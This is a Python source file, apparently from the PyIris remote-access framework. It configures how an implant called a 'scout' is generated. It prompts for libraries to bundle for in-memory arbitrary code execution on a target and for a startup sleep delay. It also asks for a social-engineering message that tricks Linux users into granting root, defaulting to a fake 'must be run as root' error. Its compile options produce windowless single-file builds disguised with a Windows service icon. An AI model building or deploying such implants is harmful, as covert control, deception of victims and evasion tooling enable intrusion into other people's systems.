import time
import os


def main(pyiris):
    generator_settings = {}
    comp_list = sorted([i for i in pyiris.config.loaded_components.values() if not i.endswith('_base')])
    if "windows/control/execute_python" in comp_list or "linux/control/execute_python" in comp_list:
        pyiris.config.help_menu['exec_py_script'] = 'Script in the terminal a block of in-memory arbitrary python code to execute on the target system'
        generator_settings["execute_python_modules"] = []
        pyiris.log.war('Manual intervention required for python_execute component')
        while True:
            try:
                module_to_load = input('\x1b[1m\x1b[37m[\x1b[0m\033[92m' +
                                       '\x1b[1m\x1b[31mwindows/control/execute_python\x1b[0m' +
                                       '\x1b[1m\x1b[37m > ]\x1b[0m ' + 'Input name of other library to package into python_execute [CTRL-C to quit] : ').strip()
                if not module_to_load:
                    pyiris.log.err('Input the name of a module')
                    continue
                generator_settings["execute_python_modules"].append(module_to_load)
            except KeyboardInterrupt:
                pyiris.log.blank("\n")
                pyiris.log.pos('Done...')
                break
    if "windows/startup/sleep" in comp_list or "linux/startup/sleep" in comp_list:
        generator_settings["scout_sleep_time"] = 0
        pyiris.config.import_statements.append('from time import sleep')
        pyiris.log.war('Manual intervention required for python_execute component')
        while True:
            try:
                sleep_duration = input('\x1b[1m\x1b[37m[\x1b[0m\033[92m' +
                                       '\x1b[1m\x1b[31mwindows/startup/sleep\x1b[0m' +
                                       '\x1b[1m\x1b[37m > ]\x1b[0m ' + 'Input duration (in seconds) for scout to sleep for before starting [CTRL-C /ENTER for default sleep of 60 seconds] : ')
                if not sleep_duration and sleep_duration != 0:
                    pyiris.log.pos('Sleep duration set to 60 seconds')
                    generator_settings["scout_sleep_time"] = 60
                    break
                sleep_duration = int(sleep_duration)
                pyiris.log.pos('Sleep duration set to ' + str(sleep_duration) + ' seconds')
                generator_settings["scout_sleep_time"] = sleep_duration
                break
            except ValueError:
                pyiris.log.err('Input a valid integer')
            except EOFError:
                try:
                    time.sleep(2)
                except KeyboardInterrupt:
                    pyiris.log.blank("\n")
                    pyiris.log.pos('Sleep duration set to 60 seconds')
                    generator_settings["scout_sleep_time"] = 60
                    break
            except KeyboardInterrupt:
                pyiris.log.blank("\n")
                pyiris.log.pos('Sleep duration set to 60 seconds')
                generator_settings["scout_sleep_time"] = 60
                break
    if "linux/startup/req_root" in comp_list:
        pyiris.log.war('Manual intervention required for req_root startup component')
        message = input('\x1b[1m\x1b[37m[\x1b[0m\033[92m' +
                        '\x1b[1m\x1b[31mlinux/startup/req_root\x1b[0m' +
                        '\x1b[1m\x1b[37m > ]\x1b[0m ' + 'Social engineering message to display to the user to request for root [Enter for default message] : ')
        if not message:
            message = 'ERROR - This file must be run as root to work'
        generator_settings["request_root_message"] = message
    if pyiris.config.scout_values["Compile"][0] == "True":
        compiler_settings = {}
        pyiris.log.war('Manual intervention required for scout compilation')
        while True:
            option = input(pyiris.config.pro + 'Compress compiled scout into one file? [y|n] : ')
            if option == 'y':
                compiler_settings["onefile"] = True
                break
            elif option == 'n':
                compiler_settings["onefile"] = False
                break
            else:
                continue
        while True:
            option = input(pyiris.config.pro + 'Compile scout so that it runs without a window? [y|n] : ')
            if option == 'y':
                compiler_settings['windowed'] = True
                break
            elif option == 'n':
                compiler_settings['windowed'] = False
                break
            else:
                continue
        while True:
            option = input(pyiris.config.pro + 'Use a custom file icon (.ico) for the compiled scout? [y|n] : ')
            if option == 'y':
                option = input(pyiris.config.pro + 'Path to file ico or press [enter] to use the default PyIris provided windows service icon (resources/windows_service.ico) : ')
                if not option:
                    option = os.path.join(pyiris.config.started_at, 'api', 'resources', 'windows_service.ico')
                compiler_settings['custom_icon_filepath'] = option
                break
            elif option == 'n':
                break
            else:
                continue
        generator_settings["compiler_settings"] = compiler_settings
    pyiris.generate.generate(generator_settings)